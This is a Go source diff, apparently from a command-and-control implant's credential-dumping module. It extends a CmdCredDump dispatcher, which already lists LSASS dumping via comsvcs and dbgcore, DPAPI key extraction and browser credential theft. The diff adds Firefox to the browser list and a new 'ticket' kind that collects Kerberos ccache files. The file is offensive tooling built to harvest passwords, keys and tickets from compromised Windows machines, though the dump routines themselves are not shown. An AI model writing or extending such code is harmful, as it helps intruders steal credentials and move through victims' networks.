@@ -25,7 +25,8 @@ import (
 //
 //	lsass   : auto | comsvcs | dbgcore
 //	dpapi   : keys
-//	browser : all | chrome | edge
+//	browser : all | chrome | edge | firefox
+//	ticket  : files（MIT ccache 文件；Windows 原生 LSA 票据不在此列）
 func CmdCredDump(cmdBuf []byte) ([]byte, error) {
 	parts := strings.SplitN(string(cmdBuf), "|", 3)
 	if len(parts) != 3 {
@@ -55,6 +56,8 @@ func CmdCredDump(cmdBuf []byte) ([]byte, error) {
 		return credDumpDPAPI(tech, fileName)
 	case "browser":
 		return credDumpBrowser(tech, fileName)
+	case "ticket":
+		return credDumpTickets(tech, fileName)
 	default:
 		return nil, errors.New("暂不支持的凭据类型: " + kind)
 	}
@@ -67,6 +70,8 @@ func defaultCredTech(kind string) string {
 		return "keys"
 	case "browser":
 		return "all"
+	case "ticket":
+		return "files"
 	default:
 		return "auto"
 	}
@@ -81,6 +86,8 @@ func credTechAllowed(kind, tech string) bool {
 		return tech == "keys"
 	case "browser":
 		return tech == "all" || tech == "chrome" || tech == "edge" || tech == "firefox"
+	case "ticket":
+		return tech == "files"
 	default:
 		return false
 	}
